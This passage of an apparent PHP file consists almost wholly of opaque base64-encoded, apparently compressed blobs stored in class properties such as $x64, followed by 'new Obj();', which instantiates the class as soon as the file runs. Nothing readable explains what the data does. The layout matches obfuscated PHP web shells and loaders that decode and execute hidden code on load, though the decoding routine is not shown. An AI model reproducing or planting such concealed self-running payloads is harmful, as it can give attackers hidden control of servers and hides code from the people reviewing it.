	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
	w9zEMzrU';

    public $x64 = 'bVLbTttAEH0OEv8wrCzWlqyEUJq08uUFuQIhNW2S9iVUkWNvlC32rrUXglXy74wXSpvA28ycmbNnzqxn
	akiA0gg8vnrAcJ1XmkXHR95vXWFKlgT6oO1KG+XrTT70veUsm/7Mpgt6NZ9/W15NZnP6KwjhLIQPAQ7y
	tc+1ZgYbp9n3H9lsvqBLdY89Afw5Pur1PPfkPuVBp2Mbjjq63g4YKvqP9XIyubnOFp3AA859LHLA81ZG
	WebInL4TVjem9XEI5xUzVgnIlcpdKQT6eXyej8Y0hI4ndM50UlixkUDjlSxbkKKQwrAHUzNhE/JC4swj
	aawLxRuTlrKwiJv+VnHDKuGTi7ML+CoNfJFWlCSIXjukuGNtKbeiO4EVheFS+Ay342vwWb8wqrphLZye
	dhm2XsqSQZIkMBrD4yPs1z6N3ql9fFsbDsf/DHg+/C7acoE6UFBR8eLuPTknr3r+DkfwZtVbGq+lqiF3
	swkhUDOzkWVCGqkNesRFYw2YtmEJ6YwkIPIaY/wBByh+lZojfp9XFtM0RXzQkae3NIh28eDF7njQnSal
	0RM=';
}

new Obj();
